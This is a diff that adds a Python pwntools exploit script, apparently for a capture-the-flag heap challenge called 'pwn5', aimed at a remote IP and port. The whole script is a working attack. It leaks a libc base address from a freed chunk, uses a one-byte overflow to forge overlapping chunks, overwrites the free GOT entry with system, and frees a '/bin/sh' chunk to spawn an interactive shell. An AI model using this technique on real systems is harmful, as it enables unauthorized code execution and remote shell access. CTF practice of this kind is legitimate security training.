@@ -1,0 +1,71 @@
+#!/usr/bin/python
+#coding=utf-8
+from PwnContext import *
+from IPython import embed as ipy
+
+context.terminal = ['gnome-terminal','-x','sh','-c']
+context.log_level = 'debug'
+
+s      = lambda data               :p.send(data) 
+sa      = lambda delim,data         :p.sendafter(delim, data)
+sl      = lambda data               :p.sendline(data)
+sla     = lambda delim,data         :p.sendlineafter(delim, data)
+r      = lambda numb=4096          :p.recv(numb)
+rl      = lambda                    :p.recvline()
+ru      = lambda delims,drop=False  :p.recvuntil(delims,drop)
+uu32    = lambda data               :u32(data.ljust(4, '\x00'))
+uu64    = lambda data               :u64(data.ljust(8, '\x00'))
+info    = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))
+irt     = lambda                    :p.interactive()
+
+context.binary = './pwn5'
+elf = ELF('./pwn5')
+p = remote('219.219.61.234','10004')
+libc = elf.libc
+
+def add(size,payload):
+	sla(':','1')
+	sla(':',str(size))
+	sa(':',payload)
+
+def edit(idx,payload):
+    sla(':','2')
+    sla(':',str(idx))
+    sa(':',payload)
+
+def delete(idx):
+	sla(':','4')
+	sla(':',str(idx))
+
+def show(idx):
+	sla(':','3')
+	sla(':',str(idx))
+
+add(0x90,"aaa") 
+add(0x48,"aaa") 
+
+delete(0)
+
+add(0x90,'\x78')
+show(0)
+
+ru(": ")
+libc_base = uu64(ru('\x7f')) -88 -0x10 -libc.sym['__malloc_hook']
+add(0x18,'a')
+add(0x10,'c')
+add(0x10,'d')
+add(0x10,'/bin/sh\x00')
+edit(2,'a'*0x18+'\x81')
+delete(3)
+payload = 'd'*0x40+ p64(8) + p64(elf.got['free'])
+
+add(0x70,payload)
+show(4)
+ru(": ")
+free = uu64(ru('\x7f'))
+system = libc_base + libc.sym['system']
+one_gadget = libc_base + 0x4f432
+edit(4,p64(system))
+# gdb.attach(p)
+delete(5)
+irt()
